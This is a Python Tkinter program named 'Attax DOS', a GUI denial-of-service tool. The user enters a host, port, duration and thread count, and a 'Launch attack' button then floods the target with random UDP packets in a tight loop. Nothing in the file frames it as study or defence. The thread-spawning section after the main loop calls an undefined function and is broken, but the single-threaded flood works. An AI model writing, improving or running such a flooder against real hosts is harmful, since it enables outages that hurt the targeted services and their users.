from tkinter import *
import tkinter as tk
import requests
import socket
import random
import time
import threading
import os
import sys
import platform

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def save_input():
    host = host_entry.get()
    port = int(port_entry.get()) 
    duration = int(duration_scale.get()) 
    threads_count = int(Threads_scale.get())

    timeout = time.time() + duration
    bytes = random._urandom(1024)

    print(f"Host: {host}")
    print(f"Port: {port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads_count} ")
    
    packets = duration * 23577
    status = f"Sending {packets} packets to {host} via port {port}"
    status_var.set(status)
    print(status)

    while time.time() < timeout:
        sock.sendto(bytes, (host, port))
         

root = tk.Tk()
root.geometry("500x500")
theme = "lightblue"
clr = theme
root.configure(bg=clr)
root.title("Attax")

w = Label(root, text='A T T A X _  D O S', font=("Arial", 20))
w.configure(bg=clr)
w.place(x=150, y=75)

host_label = Label(root, text = "status:", bg = theme)
host_label.place(x=50, y=160)
status = "waiting for input..."
status_var = tk.StringVar(value=status)
entry = tk.Entry(root, textvariable=status_var, state='readonly' , width=30 ,bg = theme )
entry.place(x=150, y=160)


host_label = Label(root, text="Host:", bg=clr)
host_label.place(x=50, y=200)
host_entry = tk.Entry(root, width=30)
host_entry.place(x=150, y=200)

port_label = Label(root, text="Port:", bg=clr)
port_label.place(x=50, y=240)
port_entry = tk.Entry(root, width=30)
port_entry.place(x=150, y=240)

duration_label = Label(root, text="Duration:", bg=clr)
duration_label.place(x=50, y=280)
duration_scale = tk.Scale(root, from_=1, to=120, orient=HORIZONTAL , length=250)
duration_scale.set(1)
duration_scale.place(x=150, y=280)

Threads_label = Label(root, text="Threads:", bg=clr)
Threads_label.place(x=50, y=320)
Threads_scale = tk.Scale(root, from_=1, to=1000, orient=HORIZONTAL, length=250)
Threads_scale.set(1)
Threads_scale.place(x=150, y=320)


save_button = tk.Button(root, text="Launch attack", command=save_input)
save_button.place(x=200, y=380)

root.mainloop()

threads = []

for i in range(threads_count):
    thread = threading.Thread(target=send_packets)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
    
if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")


